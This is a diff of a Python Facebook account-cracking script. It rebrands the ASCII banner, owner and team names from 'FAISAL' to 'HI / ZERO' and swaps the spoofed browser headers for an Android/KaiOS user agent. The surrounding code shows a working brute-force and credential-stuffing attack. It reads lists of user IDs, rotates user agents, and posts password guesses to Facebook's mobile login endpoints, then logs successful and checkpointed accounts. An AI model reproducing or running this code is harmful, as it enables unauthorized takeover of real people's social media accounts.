@@ -168,17 +168,15 @@ syed =[
 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
 logo=("""\033[1;97m
-  ______      _____  _____         _      
- |  ____/\   |_   _|/ ____|  /\   | |     
- | |__ /  \    | | | (___   /  \  | |     
- |  __/ /\ \   | |  \___ \ / /\ \ | |     
- | | / ____ \ _| |_ ____) / ____ \| |____ 
- |_|/_/    \_\_____|_____/_/    \_\______|
+ _   _  ____ 
+( )_( )(_  _)
+ ) _ (  _)(_ 
+(_) (_)(____)
                         
 --------------------------------------------------
->>  Owner    : ITX FAISAL
->>  Facebook : FAISL ALI
->>  Version  : 0.3
+>>  Owner    : ITX HI
+>>  Facebook : NO FB
+>>  Version  : 0.0
 >>  Team❤    : ZERO
 --------------------------------------------------""")
 def linex():
@@ -193,7 +191,7 @@ pcp=[]
 id=[]
 def fia():    
 			print(logo)
-			print('\x1b[1;91m>>> FAISAL TEAM  VERSION :\x1b[1;92m 1.1 ')
+			print('\x1b[1;91m>>> ZERO TEAM  VERSION :\x1b[1;92m 1.1 ')
 			linex()
 			print('[1] Crack File Clone\n[2] Crack Pak Random Clone\n[0] Exit')
 			linex()
@@ -201,7 +199,7 @@ def fia():
 			if xd in ['1','01']:
 				os.system('clear')
 				print(logo)
-				print('Example : /sdcard/FAISAL.txt')
+				print('Example : /sdcard/HI.txt')
 				linex()
 				file = input(' Put file path\033[1;37m: ')
 				try:
@@ -271,7 +269,7 @@ def fia():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[HI / ZERO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -313,7 +311,7 @@ def mmm(ids,names,passlist):
 	loop+=1
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[HI / ZERO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -513,7 +511,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mFAISAL / NAZIR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
+			sys.stdout.write(f'\r [\033[1;97mHI / ZERO\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -534,14 +532,14 @@ def fcrack(uid,pwx,tl):
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
